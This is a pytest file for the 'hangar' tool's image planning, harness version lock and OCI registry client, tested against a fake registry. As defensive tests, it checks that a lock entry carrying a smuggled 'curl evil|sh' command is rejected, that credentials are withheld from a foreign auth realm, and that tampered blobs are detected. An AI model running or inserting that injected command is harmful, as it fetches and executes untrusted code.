"""Images built before anyone waits (images.py, registry.py): the plan of tags the code needs, registry lookups over
HTTP, the harness lock, versions recorded at pack build, and packs mounted by digest."""

from __future__ import annotations

import asyncio
import copy
import gzip
import hashlib
import io
import json
import subprocess
import tarfile
from pathlib import Path

import httpx
import pytest
import yaml
from typer.testing import CliRunner

from hangar import cli, images
from hangar.envspec import EnvCatalog
from hangar.harnesses import (
    HARNESSES,
    LOCK_FILE,
    VERSION_FILE,
    Harness,
    apply_lock,
    pack_dockerfile,
    pack_script,
    pack_tag,
    version_from_log,
)
from hangar.models import CredentialKind, SessionState
from hangar.registry import Registry, RegistryError, parse
from hangar.sessions import NewSession
from tests.test_session_streams import settle, svc, world  # noqa: F401 - fixtures

REG = "us-central1-docker.pkg.dev/proj/hangar"
AGENTS = ("claude-code", "codex", "pi", "antigravity")


@pytest.fixture
def creds(broker):
    broker.put("claude", "claude-code", CredentialKind.API_KEY, "sk-claude")
    broker.put("oai", "codex", CredentialKind.API_KEY, "sk-codex")
    broker.put("orkey", "pi", CredentialKind.API_KEY, "sk-or")
    broker.put("ghtok", "generic-secret", CredentialKind.GENERIC, "ghp_123", env_var="UNUSED_GH")
    return broker


# ------------------------------------------------------------------------------------------------ the harness lock
def test_every_installed_harness_is_pinned_by_the_lock():
    for name, h in HARNESSES.items():
        if not h.install:
            continue
        assert h.version and h.version != "latest" and h.version[0].isdigit(), name
        assert pack_tag(h, "p", REG).split(":")[-1].startswith(f"{h.version}-"), name
    claude, agy = HARNESSES["claude-code"], HARNESSES["antigravity"]
    assert claude.version == "2.1.296" and set(claude.pin) == {"SHA256_X86_64", "SHA256_AARCH64"}
    assert agy.version == "1.3.3" and set(agy.pin) == {"BUILD", "SHA512_X86_64", "SHA512_AARCH64"}
    assert all(len(v) == 64 for k, v in claude.pin.items()) and len(agy.pin["SHA512_X86_64"]) == 128
    # The recipes install exactly the locked artifact and check it, rather than whatever an installer calls latest.
    for name in ("claude-code", "antigravity"):
        script = pack_script(HARNESSES[name])
        assert "install.sh" not in script and ("sha256sum -c" in script or "sha512sum -c" in script), name
        assert all(f"{k}={v}" in script for k, v in HARNESSES[name].pin.items())


def test_the_lock_refuses_floating_unknown_or_unsafe_entries():
    lock = yaml.safe_load(LOCK_FILE.read_text())
    fresh = {k: v.model_copy(deep=True) for k, v in HARNESSES.items()}
    apply_lock(fresh, copy.deepcopy(lock))
    for bad, match in (
        ({**lock, "codex": None}, "codex needs an exact `version`"),
        ({**lock, "pi": {"version": "latest"}}, "pi needs an exact"),
        ({**lock, "nope": {"version": "1"}}, "unknown harnesses: nope"),
        ({**lock, "codex": {"version": "0.1", "url": "x; curl evil|sh"}}, "not a plain version"),
        ({**lock, "codex": {"version": "0.1", "path": "x"}}, "can't be an install variable"),
    ):
        with pytest.raises(ValueError, match=match):
            apply_lock({k: v.model_copy(deep=True) for k, v in HARNESSES.items()}, bad)


def test_the_pack_build_records_the_installed_version_and_fails_on_another(tmp_path):
    """The script a pack build runs: it prints the CLI's own --version on a marker line, keeps it in VERSION_FILE,
    and stops when the CLI isn't the locked version."""
    def run(version: str) -> subprocess.CompletedProcess:
        h = Harness(name="fakecli", title="x", version=version, verify="fakecli --version",
                    install='mkdir -p "$PREFIX/bin"\n'
                            'printf \'#!/bin/sh\\necho "warning: old runtime"\\necho "fakecli 1.2.3 (vendor)"\\n\' '
                            '> "$PREFIX/bin/fakecli"\n'
                            'chmod 755 "$PREFIX/bin/fakecli"')
        script = pack_script(h).replace("/opt/hangar/harness", str(tmp_path / "opt")).replace(
            f"> /{VERSION_FILE}", f"> {tmp_path}/{VERSION_FILE}")
        (tmp_path / "pack.sh").write_text(script)
        return subprocess.run(["bash", str(tmp_path / "pack.sh")], capture_output=True, text=True)

    ok = run("1.2.3")
    assert ok.returncode == 0, ok.stderr
    assert version_from_log(ok.stdout + ok.stderr) == "fakecli 1.2.3 (vendor)"
    assert (tmp_path / VERSION_FILE).read_text() == "fakecli 1.2.3 (vendor)\n"
    bad = run("1.2.4")
    assert bad.returncode != 0 and "installed 'warning: old runtime', but the lock pins 1.2.4" in bad.stderr


def test_the_version_is_the_packs_own_last_layer():
    df = pack_dockerfile(HARNESSES["codex"])
    assert df.rstrip().splitlines()[-1] == f"COPY --from=pack-codex /{VERSION_FILE} /{VERSION_FILE}"
    log = ["#9 3.21 + INSTALLED='codex-cli 0.162.1'", "#9 3.22 hangar-harness-version: codex-cli 0.162.1", "#9 DONE"]
    assert version_from_log(log) == "codex-cli 0.162.1" and version_from_log(["nothing"]) is None


# ------------------------------------------------------------------------------------------------ the plan
async def test_the_plan_is_what_fleet_builds_with_packs(fleet, settings, creds):
    fake = fleet.providers["docker"]
    fake.image_volumes = True
    planned = {i.tag: i for i in images.plan(settings, fleet.catalog, "docker", packs=True)}
    sb = await fleet.create("agents")
    await asyncio.gather(*fleet._pack_builds.values())
    assert fake.images <= set(planned), "fleet built a tag the plan doesn't know"
    agents = {t for t, i in planned.items() if i.name == "agents" or i.kind == "pack"}
    assert sb.image in agents and agents - {sb.image} == {t for t in fake.images if "/harness-" in t}
    assert {i.name for i in planned.values() if i.kind == "pack"} == {"claude-code", "codex", "pi"}


async def test_the_plan_is_what_fleet_builds_when_harnesses_are_baked(fleet, settings, creds):
    planned = {i.tag: i for i in images.plan(settings, fleet.catalog, "docker", packs=False)}
    default = await fleet.create("agents")
    other = await fleet.create("agents", harness="pi")
    assert planned[default.image].harness == "claude-code" and planned[other.image].harness == "pi"
    assert not [i for i in planned.values() if i.kind == "pack"]


def test_the_plan_skips_prebuilt_images_and_reports_broken_specs(settings, tmp_path):
    (tmp_path / "pre.yaml").write_text("name: pre\nimage: ghcr.io/me/pre:1\n")
    (tmp_path / "broken.yaml").write_text("name: broken\nextends: no-such-env\n")
    (tmp_path / "packonly.yaml").write_text("name: packonly\nharnesses: [codex]\nharness_mode: pack\n")
    settings.registry = REG
    items = images.plan(settings, EnvCatalog([tmp_path]), "kubernetes", packs=False)
    assert "pre" not in {i.name for i in items}
    errors = {i.name: i.detail for i in items if i.status == "error"}
    assert set(errors) == {"broken", "packonly"} and "can't mount packs" in errors["packonly"]
    with pytest.raises(ValueError, match="HANGAR_REGISTRY"):
        settings.registry = None
        images.plan(settings, EnvCatalog([tmp_path]), "kubernetes")
    with pytest.raises(ValueError, match="covers kubernetes and docker"):
        images.plan(settings, EnvCatalog([tmp_path]), "e2b")


# ------------------------------------------------------------------------------------------------ a fake registry
def _layer(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return gzip.compress(buf.getvalue())


def _sha(b: bytes) -> str:
    return "sha256:" + hashlib.sha256(b).hexdigest()


class FakeRegistry:
    """An OCI registry behind a bearer challenge, as Artifact Registry answers: GET /v2/token with Basic
    oauth2accesstoken:<google token> gives a pull token."""

    def __init__(self, google_token: str = "goog-tok"):
        self.google_token = google_token
        self.requests: list[httpx.Request] = []
        self.manifests: dict[tuple[str, str], bytes] = {}  # (repo, tag or digest) -> body
        self.blobs: dict[str, bytes] = {}

    def push(self, repo: str, tag: str, version: str | None = "codex-cli 0.162.1", index: bool = False) -> str:
        big = b"x" * (MAX + 1)
        layers = [{"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip", "digest": _sha(big),
                   "size": len(big)}]
        if version is not None:
            vl = _layer({VERSION_FILE: f"{version}\n".encode()})
            self.blobs[_sha(vl)] = vl
            layers.append({"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip", "digest": _sha(vl),
                           "size": len(vl)})
        m = json.dumps({"schemaVersion": 2, "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
                        "layers": layers}).encode()
        self.manifests[(repo, _sha(m))] = m
        top = m
        if index:
            top = json.dumps({"schemaVersion": 2, "mediaType": "application/vnd.oci.image.index.v1+json",
                              "manifests": [
                                  {"digest": _sha(b"att"), "platform": {"os": "unknown", "architecture": "unknown"}},
                                  {"digest": _sha(m), "platform": {"os": "linux", "architecture": "amd64"}}]}).encode()
            self.manifests[(repo, _sha(top))] = top
        self.manifests[(repo, tag)] = top
        return _sha(top)

    def handler(self, req: httpx.Request) -> httpx.Response:
        self.requests.append(req)
        path = req.url.path
        if path == "/v2/token":
            assert req.headers.get("authorization", "").startswith("Basic ")
            import base64
            user, _, pw = base64.b64decode(req.headers["authorization"][6:]).decode().partition(":")
            if (user, pw) != ("oauth2accesstoken", self.google_token):
                return httpx.Response(401)
            return httpx.Response(200, json={"token": "pull-tok", "expires_in": 3600})
        if req.headers.get("authorization") != "Bearer pull-tok":
            host = req.url.host
            return httpx.Response(401, headers={"www-authenticate": f'Bearer realm="https://{host}/v2/token",'
                                                f'service="{host}",scope="repository:x:pull"'})
        repo, kind, ref = path[len("/v2/"):].rsplit("/", 2)
        if kind == "manifests":
            body = self.manifests.get((repo, ref))
            if body is None:
                return httpx.Response(404)
            return httpx.Response(200, content=b"" if req.method == "HEAD" else body,
                                  headers={"docker-content-digest": _sha(body)})
        if kind == "blobs" and ref in self.blobs:
            return httpx.Response(200, content=self.blobs[ref])
        return httpx.Response(404)


MAX = 64 * 1024


@pytest.fixture
def reg(monkeypatch):
    monkeypatch.setenv("HANGAR_REGISTRY_TOKEN", "goog-tok")
    fake = FakeRegistry()
    return fake, Registry(transport=httpx.MockTransport(fake.handler))


async def test_registry_answers_exists_digest_and_version_over_http(reg):
    fake, r = reg
    d = fake.push("proj/hangar/harness-codex", "0.162.1-abc", index=True)
    tag = f"{REG}/harness-codex:0.162.1-abc"
    assert await r.digest(tag) == d
    assert await r.pinned(tag) == f"{REG}/harness-codex@{d}"
    assert await r.harness_version(f"{REG}/harness-codex@{d}") == "codex-cli 0.162.1"
    assert await r.digest(f"{REG}/harness-codex:nope") is None
    fake.push("proj/hangar/harness-pi", "old", version=None)  # built before versions were recorded
    assert await r.harness_version(f"{REG}/harness-pi:old") is None
    # one token exchange per repository, then plain requests
    assert sum(q.url.path == "/v2/token" for q in fake.requests) == 2
    await r.close()


async def test_registry_unknown_is_not_missing(monkeypatch):
    monkeypatch.setenv("HANGAR_REGISTRY_TOKEN", "wrong")
    r = Registry(transport=httpx.MockTransport(FakeRegistry().handler))
    with pytest.raises(RegistryError, match="refused a pull token"):
        await r.digest(f"{REG}/x:y")
    assert isinstance((await r.check([f"{REG}/x:y"]))[f"{REG}/x:y"], RegistryError)
    with pytest.raises(RegistryError, match="names no registry"):
        parse("hangar-env/agents:abc")
    await r.close()


async def test_google_credentials_never_go_to_a_realm_on_another_host(monkeypatch):
    monkeypatch.setenv("HANGAR_REGISTRY_TOKEN", "goog-tok")
    seen: list[httpx.Request] = []

    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(req)
        if req.url.host == "evil.example":
            return httpx.Response(401)
        return httpx.Response(401, headers={"www-authenticate": 'Bearer realm="https://evil.example/token"'})

    r = Registry(transport=httpx.MockTransport(handler))
    with pytest.raises(RegistryError):
        await r.digest(f"{REG}/x:y")
    assert [q.url.host for q in seen] == ["us-central1-docker.pkg.dev", "evil.example"]
    assert "authorization" not in seen[1].headers
    await r.close()


async def test_registry_rejects_content_that_doesnt_match_its_digest(reg):
    fake, r = reg
    d = fake.push("proj/hangar/harness-codex", "t")
    m = json.loads(fake.manifests[("proj/hangar/harness-codex", d)])
    fake.blobs[m["layers"][-1]["digest"]] = _layer({VERSION_FILE: b"evil 6.6.6\n"})
    with pytest.raises(RegistryError, match="doesn't match its digest"):
        await r.harness_version(f"{REG}/harness-codex:t")
    await r.close()


async def test_check_looks_tags_up_without_a_process_per_tag(reg, settings, monkeypatch):
    fake, r = reg
    settings.registry = REG
    items = images.plan(settings, EnvCatalog([Path(__file__).parent / "fixtures" / "envs"]), "kubernetes")
    codex = next(i for i in items if i.name == "codex")
    d = fake.push("proj/hangar/harness-codex", codex.tag.rsplit(":", 1)[1])

    async def no_processes(*a, **kw):
        raise AssertionError(f"spawned {a}")

    monkeypatch.setattr(asyncio, "create_subprocess_exec", no_processes)
    await images.check(items, "kubernetes", registry=r)
    assert codex.status == "present" and codex.ref == f"{REG}/harness-codex@{d}"
    assert {i.status for i in items if i is not codex} == {"missing"}
    # Every item is its own repository: one challenged lookup and one token each, then one HEAD per tag.
    assert sum(q.method == "HEAD" for q in fake.requests) == 2 * len(items)
    assert sum(q.url.path == "/v2/token" for q in fake.requests) == len(items)
    fake.requests.clear()
    await images.check(items, "kubernetes", registry=r)
    assert [q.method for q in fake.requests] == ["HEAD"] * len(items)
    await r.close()


async def test_build_missing_builds_only_what_is_missing_and_reports_failures(settings, monkeypatch):
    from hangar.providers import _build

    settings.registry = REG
    items = images.plan(settings, EnvCatalog([Path(__file__).parent / "fixtures" / "envs"]), "kubernetes")
    items[0].status = "present"
    for i in items[1:]:
        i.status = "missing"
    built: list[str] = []

    async def fake_build(ctx, tag, log=None, platform=None, push=False):
        assert platform == "linux/amd64" and push
        if "harness-pi" in tag:
            raise RuntimeError("npm ERR! network")
        built.append(tag)
        if "/harness-" in tag:
            log(f"#9 2.0 hangar-harness-version: {tag.split('harness-')[1].split(':')[0]} 9.9")
        return tag

    class Pinned:
        async def pinned(self, tag):
            return tag.rsplit(":", 1)[0] + "@sha256:" + "a" * 64

    monkeypatch.setattr(_build, "docker_build", fake_build)
    monkeypatch.setattr(_build, "docker_available", lambda: asyncio.sleep(0, True))
    await images.build_missing(items, settings, "kubernetes", "docker", jobs=3, registry=Pinned())
    assert items[0].tag not in built
    status = {i.name: i for i in items if i.kind == "pack"}
    assert status["pi"].status == "failed" and "npm ERR" in status["pi"].detail
    assert status["codex"].status == "built" and status["codex"].installed == "codex 9.9"
    assert status["codex"].ref.endswith("@sha256:" + "a" * 64)


# ------------------------------------------------------------------------------------------------ fleet: digests
def _digests(fake, versions: dict[str, str]):
    """The fake provider, as one with a registry: it knows each image's digest and each pack's recorded version."""
    async def image_digest(tag):
        return tag.rsplit(":", 1)[0] + "@sha256:" + hashlib.sha256(tag.encode()).hexdigest()

    async def pack_version(ref):
        return next((v for h, v in versions.items() if f"/harness-{h}@" in ref), None)

    fake.image_digest, fake.pack_version = image_digest, pack_version


async def test_packs_are_mounted_by_digest_and_the_version_is_on_the_sandbox_and_its_runs(fleet, creds):
    fake = fleet.providers["docker"]
    fake.image_volumes = True
    _digests(fake, {"claude-code": "2.1.296 (Claude Code)", "codex": "codex-cli 0.162.1"})
    sb = await fleet.create("agents")
    await asyncio.gather(*fleet._pack_builds.values())
    sb = await fleet.create("agents")
    assert all("@sha256:" in ref and ":" not in ref.split("@")[0].rsplit("/", 1)[1]
               for ref in sb.info["packs"].values()), sb.info["packs"]
    assert fake.packs_mounted[-1] == sb.info["packs"]
    assert sb.info["harness_version"] == "2.1.296 (Claude Code)"
    run = await fleet.run_agent(sb.id, "hi")
    assert run["harness_version"] == "2.1.296 (Claude Code)"
    assert fleet.get(sb.id).info["runs"][-1]["harness_version"] == "2.1.296 (Claude Code)"
    await fleet.terminal_kill(sb.id, run["run_id"])
    env = next(e for e in fleet.environments() if e["name"] == "agents")
    assert env["harness_versions"]["claude-code"] == {"locked": "2.1.296", "installed": {"docker": "2.1.296 (Claude "
                                                                                                    "Code)"}}
    assert env["harness_versions"]["pi"] == {"locked": "1.1.0", "installed": {}}


async def test_a_pack_this_hangar_builds_records_the_version_from_its_build_log(fleet, creds):
    fake = fleet.providers["docker"]
    fake.image_volumes = True
    real = fake.build_template

    async def build(spec, ctx, tag, log=None):
        if "/harness-" in tag and log:
            await log("#7 1.2 hangar-harness-version: 2.1.296 (Claude Code)")
        return await real(spec, ctx, tag, log)

    fake.build_template = build
    sb = await fleet.create("agents")
    assert sb.info["packs"]["claude-code"].startswith("hangar-env/harness-claude-code:"), "no digest: by tag"
    assert sb.info["harness_version"] == "2.1.296 (Claude Code)"


async def test_registering_a_pack_resolves_its_digest_and_keeps_the_one_it_replaces(fleet, creds):
    fake = fleet.providers["docker"]
    fake.image_volumes = True
    _digests(fake, {"codex": "codex-cli 0.162.1"})
    tag, _ = fleet.pack_context("codex")
    first = await fleet.register_pack("codex", tag)
    assert first.startswith("hangar-env/harness-codex@sha256:")
    second = await fleet.register_pack("codex", tag + "-other")
    info = fleet._pack_info("docker", "codex")
    assert info["prev"] == first and info["ref"] == second and info["locked"] == "0.162.1"
    assert fleet.harness_version("docker", "codex") == "codex-cli 0.162.1"


async def test_a_pack_registered_with_its_digest_is_mounted_by_it(fleet, creds):
    from hangar.fleet import FleetError

    tag, _ = fleet.pack_context("codex")
    ref = await fleet.register_pack("codex", f"{tag}@sha256:{'b' * 64}")
    assert ref == f"hangar-env/harness-codex@sha256:{'b' * 64}"
    with pytest.raises(FleetError, match="not a sha256 digest"):
        await fleet.register_pack("codex", f"{tag}@sha256:../../x")


async def test_a_forced_rebuild_of_the_same_tag_mounts_the_new_digest(fleet, creds):
    fake = fleet.providers["docker"]
    fake.image_volumes = True
    n = {"builds": 0}

    async def image_digest(tag):
        return tag.rsplit(":", 1)[0] + f"@sha256:{n['builds']:064d}"

    real = fake.build_template

    async def build(spec, ctx, tag, log=None):
        n["builds"] += 1
        return await real(spec, ctx, tag, log)

    fake.image_digest, fake.build_template = image_digest, build
    before = await fleet.build_pack("codex")
    after = await fleet.build_pack("codex", force=True)
    assert before != after and after.endswith(f"{n['builds']:064d}")
    spec = await fleet._resolve_packs(fleet.catalog.get("agents"), "docker", "t", lazy=True)
    assert spec.packs["codex"] == after
    await asyncio.gather(*fleet._pack_builds.values())


async def test_each_session_turn_records_the_harness_version(svc, world, fleet):  # noqa: F811
    svc.new(NewSession(name="ver", environment="sesenv", repo=world["url"], message="start"), owner="admin",
            requester="sean")
    s = await settle(svc, "ver")
    assert s.state == SessionState.IDLE, s.reason
    assert s.turns[0].harness_version is None, "no pack, no recorded version"
    sb = fleet.get(s.sandbox_id)
    sb.info["harness_version"] = "agent 4.5.6"
    fleet.store.put(sb)
    svc.send("ver", "more", requester="sean")
    s = await settle(svc, "ver")
    assert s.turns[-1].harness_version == "agent 4.5.6"


# ------------------------------------------------------------------------------------------------ CLI
def test_pack_publish_never_overwrites_an_existing_tag_without_force(monkeypatch):
    calls: list[tuple] = []

    class Resp:
        status_code = 200
        headers = {"X-Hangar-Image": f"{REG}/harness-codex:0.162.1-abc"}
        content = b"tar"

    class Client:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def get(self, *a, **kw):
            return Resp()

    monkeypatch.setattr(cli, "_client", Client)
    monkeypatch.setattr("shutil.which", lambda _: "/usr/bin/docker")
    monkeypatch.setattr(cli, "_tag_exists", lambda tag: True)
    monkeypatch.setattr(cli, "_build_and_push", lambda *a: calls.append(("build", a[0])))
    monkeypatch.setattr(cli, "_call", lambda *a, **kw: calls.append(("register", kw["json"]["image"])) or
                        {"image": f"{REG}/harness-codex@sha256:{'a' * 64}"})
    runner = CliRunner()
    r = runner.invoke(cli.app, ["pack", "publish", "codex"])
    assert r.exit_code == 0, r.output
    assert "already exists" in r.output and [c[0] for c in calls] == ["register"]
    calls.clear()
    r = runner.invoke(cli.app, ["pack", "publish", "codex", "--force"])
    assert r.exit_code == 0, r.output
    assert [c[0] for c in calls] == ["build", "register"]


def test_images_plan_cli_table_json_and_exit_codes(monkeypatch, tmp_path):
    (tmp_path / "e.yaml").write_text("name: e\nharnesses: [codex]\n")

    async def check(items, provider, registry=None, concurrency=8):
        for i in items:
            i.status = "missing" if i.kind == "pack" else "present"
        return items

    monkeypatch.setattr(images, "check", check)
    runner = CliRunner()
    args = ["images", "plan", "--registry", REG, "--env-dir", str(tmp_path)]
    r = runner.invoke(cli.app, args)
    assert r.exit_code == 3 and "harness-codex:0.162.1-" in r.output and "missing" in r.output
    r = runner.invoke(cli.app, [*args, "--json"])
    out = json.loads(r.output)
    assert out["missing"] == 1 and {i["kind"] for i in out["items"]} == {"environment", "pack"}
    r = runner.invoke(cli.app, [*args, "--no-check"])
    assert r.exit_code == 0 and "unchecked" in r.output


async def test_the_kubernetes_provider_asks_the_registry_not_a_cli_and_mounts_digests(reg, monkeypatch):
    pytest.importorskip("kubernetes")
    from hangar.envspec import EnvSpec
    from tests.test_kubernetes import provider

    fake, r = reg
    d = fake.push("proj/hangar/harness-codex", "0.162.1-abc")
    p = provider(registry=REG)
    p._registry = r

    async def no_processes(*a, **kw):
        raise AssertionError(f"spawned {a}")

    monkeypatch.setattr(asyncio, "create_subprocess_exec", no_processes)
    tag = f"{REG}/harness-codex:0.162.1-abc"
    assert await p.image_exists(tag) and not await p.image_exists(f"{REG}/harness-codex:gone")
    pinned = await p.image_digest(tag)
    assert pinned == f"{REG}/harness-codex@{d}"
    assert await p.pack_version(pinned) == "codex-cli 0.162.1"
    spec = EnvSpec(name="py", harnesses=["codex"])
    spec.packs = {"codex": pinned}
    vol = p._pod_template(spec, "img")["spec"]["volumes"][0]
    assert vol["image"] == {"reference": pinned, "pullPolicy": "IfNotPresent"}
    await r.close()


def test_rest_registers_a_pack_by_digest_and_lists_locked_and_installed_versions(settings):
    from fastapi.testclient import TestClient

    from hangar.app import create_app
    from tests.conftest import FakeProvider

    settings.admin_token = "t0ken"
    app = create_app(settings)
    with TestClient(app) as c:
        fake = FakeProvider()
        fake.image_volumes = True
        _digests(fake, {"codex": "codex-cli 0.162.1"})
        app.state.hangar.fleet.providers["docker"] = fake
        app.state.hangar.fleet.provider_errors.pop("docker", None)
        c.headers["Authorization"] = "Bearer t0ken"
        tag = c.get("/api/harnesses/codex/context").headers["X-Hangar-Image"]
        r = c.post("/api/harnesses/codex/images", json={"image": tag}).json()
        assert r["image"].startswith("hangar-env/harness-codex@sha256:")
        codex = next(h for h in c.get("/api/harnesses").json() if h["name"] == "codex")
        assert codex["version"] == "0.162.1" and codex["installed"] == {"docker": "codex-cli 0.162.1"}


# ------------------------------------------------------------------------------------------------ harness P2
async def test_launch_glue_ships_with_hangar_not_in_the_pack(fleet, creds):
    """Codex's pack is the vendor's files; the bundled rg reaches PATH (last, so the project's own wins) from the
    claim-time environment. So how hangar starts a harness can change without a new pack digest."""
    codex = HARNESSES["codex"]
    sb = await fleet.create("agents", harness="codex")
    env = (await fleet.read_file(sb.id, "/home/agent/.hangar/env")).decode()
    assert f'export PATH="{codex.prefix}/bin:$PATH:{codex.prefix}/libexec/codex-path"' in env
    before = pack_tag(codex, "p", REG)
    codex_moved = codex.model_copy(update={"path_extra": ["libexec/somewhere-else"]})
    assert pack_tag(codex_moved, "p", REG) == before, "a launch change is not a pack change"
    for name in AGENTS:
        assert "readlink" not in HARNESSES[name].install and "dirname" not in HARNESSES[name].install, name
